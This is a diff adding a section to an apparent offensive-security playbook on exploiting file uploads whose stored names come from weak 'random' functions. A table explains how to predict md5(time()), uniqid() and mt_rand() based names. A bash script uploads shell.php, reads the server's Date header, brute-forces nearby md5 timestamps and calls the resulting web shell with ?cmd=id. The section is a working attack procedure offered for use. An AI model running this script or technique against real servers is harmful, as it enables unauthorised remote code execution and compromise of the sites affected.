@@ -702,3 +702,35 @@ for the RCE sink and [[windows-amsi-bypass]] when the executed language is Power
 <!-- promoted-slug: confirm-server-side-script-execution-is-enabled-in-an-upload -->
 
 <!-- promoted-slug: a-file-upload-disabled-control-can-be-dead-on-arrival-if-a-s -->
+
+## Predict a weak "random" stored filename
+
+An upload that accepts your file but **renames it with a weak "random" function** is still
+reachable: if the name is derived from a low-entropy, attacker-observable seed, you can predict it
+and request the stored file directly (turning an "unlinkable" upload into web-shell RCE).
+
+**Tell:** the stored name is a fixed-length hex string (32 hex = `md5(...)`, 40 = `sha1`), and an
+existing sample (e.g. a leaked attachment) shows that format. Common weak schemes and how to invert:
+
+| Scheme | Predict it by |
+|---|---|
+| `md5(time())` / `md5(date(...))` | the server's `Date` response header at upload = the seed; brute a +/-few-second window |
+| `md5(uniqid())` (no more_entropy) | `uniqid()` = `sprintf('%08x%05x', sec, usec)` of upload time; brute the microsecond range |
+| `md5(rand())` / `md5(mt_rand())` | seedable/small space; recover the PRNG seed if another output leaks (see [[cryptography-attacks]] PRNG) |
+| stored name kept the original extension | so `<hash>.php` executes -> request it with `?cmd=` |
+
+`md5(time())` example (the highest-frequency case):
+```bash
+# upload the shell, capturing the server Date header
+D=$(curl -s -D - -b cookies.txt "$URL" -F "file=@shell.php" -F "submit=x" -o /dev/null | sed -n 's/^[Dd]ate: //p' | tr -d '\r')
+T=$(date -d "$D" +%s)
+# the stored name is md5(<unix second>) . <ext>; brute a small window
+for off in $(seq -5 5); do
+  h=$(printf %s $((T+off)) | md5sum | cut -d' ' -f1)
+  curl -s "$BASE/uploads/$h.php?cmd=id" | grep -q uid= && echo "shell -> /uploads/$h.php"
+done
+```
+Confirm by execution (per the confirmation gate), not by a 200 on the upload. If PHP is filtered by
+extension, this pairs with any allowed-but-executable extension or an [[path-traversal-lfi]] include.
+
+<!-- promoted-slug: upload-predictable-random-filename -->
